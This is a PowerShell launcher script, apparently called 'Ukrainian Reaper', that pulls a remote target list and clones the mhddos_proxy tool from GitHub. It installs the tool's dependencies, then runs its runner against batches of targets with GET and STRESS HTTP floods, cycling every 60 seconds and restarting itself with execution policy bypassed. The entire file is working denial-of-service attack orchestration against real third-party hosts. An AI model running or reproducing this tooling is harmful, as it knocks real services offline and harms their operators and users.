[CmdletBinding()]
param([ int]$threads = 5, [string[]]$methods = @('GET', 'STRESS') )

Clear-Host

$ErrorActionPreference = 'Stop'

$strMethods = "$methods"

# Will be necessary for Windows 7 adaptation
If ($PSVersionTable.PSVersion.Major -lt 3) {
    $PsScriptRoot = Split-Path $MyInvocation.MyCommand.Path 
}
. $PsScriptRoot\functions.ps1

$LogoTxt = Get-Content -Path "$PsScriptRoot\Logo.txt"
$LogoSize = $LogoTxt.Length
for ($i=0; $i -lt $LogoSize; $i++ ) {
    $fgColor = $i -lt ( $LogoSize/2) ? "Blue" : "Yellow"
    Write-MiddleHost $LogoTxt[$i] -ForegroundColor $fgColor -BackgroundColor 'Black'
}
Write-MiddleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
Write-MiddleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'

# get targets
Write-MiddleHost "Завантаження цілей" -NoNewline
$TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"

# IP FILTERING:
# select lines started with http or tcp only, split them by space
# resolve ip addresses and remove duplicated (first unique persist)
# If ip was not resolved asume as unique
# Slow and not confirmed. Produce less targets, some urls in the list have the same ip, I believe it is better, still not sure
# $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
#     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
#     Foreach-Object { [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ } } |
#     Sort-Object -Property 'ip' -Unique |
#     Select-Object -ExpandProperty 'address'

# URL FILTERING:
$TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
    Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
    Sort-Object -Unique

$NumberOfTargets = $TargetsList.Length
[System.Collections.ArrayList]$TargetFiles = @()

# static number of files, dynamic number of targets in file
# create files with targets
# $NumberOfTargetsFiles = 4
# # little math to calculate number of entries in one file
# $LnInFile = [math]::Ceiling($NumberOfTargets / $NumberOfTargetsFiles)

# dynamic number of files, static number of targets in file
$LnInFile  = 500
$NumberOfTargetsFiles = [math]::Ceiling($NumberOfTargets / $LnInFile)
for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++){
    $null = $TargetFiles.Add("xa${i}.uaripper.txt")
}

for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
	$s = $i * $LnInFile
    $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($s + $LnInFile - 1) : ($NumberOfTargets)
    # workaround to save targets without empty line in the end of file as Unix(LF)
    ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])" -NoNewline
}

Write-MiddleHost "Знайдено унікальних $NumberOfTargets цілей" -Here -NoNewline
$TargetsList = $null

Write-MiddleHost "Завантаження mhddos_proxy" -NoNewline
$RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
$StartParams = @{
    'FilePath' = "$RootPath\Git\cmd\git.exe"
    'Wait' = $true
    'WindowStyle' = 'Hidden'
}
if (Test-Path -Path $LocalMhddosProxy) {
    $StartParams.Add("ArgumentList", "-C $LocalMhddosProxy pull --quiet")
}
else {
    $StartParams.Add("ArgumentList", "clone $RemoteMhddosProxy $LocalMhddosProxy --quiet")
}
Start-Process @StartParams

Write-MiddleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
&"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet --no-warn-script-location

Write-MiddleHost "Щоб завершити роботу натисніть Ctrl+C"
Write-MiddleHost "Запуск Multidd"

try {
    foreach ($targetFile in $TargetFiles) {
        $FilePath = "$RootPath\tmp\$targetFile"
        $StartParams = @{
            'FilePath' = "$PyPath\python.exe"
            'ArgumentList' = "$LocalMhddosProxy\runner.py -c $FilePath -t $threads --http-methods $strMethods"
            'WorkingDirectory' = "$LocalMhddosProxy"
            'NoNewWindow' = $true
            'PassThru' = $true
            'Wait' = $false
        }
        (Start-Process @StartParams).PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
        Start-Sleep -Seconds 60
        Get-Process | Where-Object { $_.Path -eq "$PyPath\python.exe"} | Stop-Process -Force
    }
}
catch { $_ }
finally {
    Write-MiddleHost "Завершення роботи mhddos_proxy"
    Get-Process | Where-Object { $_.Path -eq "$PyPath\python.exe"} | Stop-Process -Force
}

$StartParams = @{
    'FilePath' = "$RootPath\Powershell\pwsh.exe"
    'ArgumentList' = "-ExecutionPolicy Bypass -File `"$RootPath\PsScripts\Start.ps1`""
    'NoNewWindow' = $true
    'Wait' = $false
}
Write-MiddleHost "Перезапуск"
Start-Process @StartParams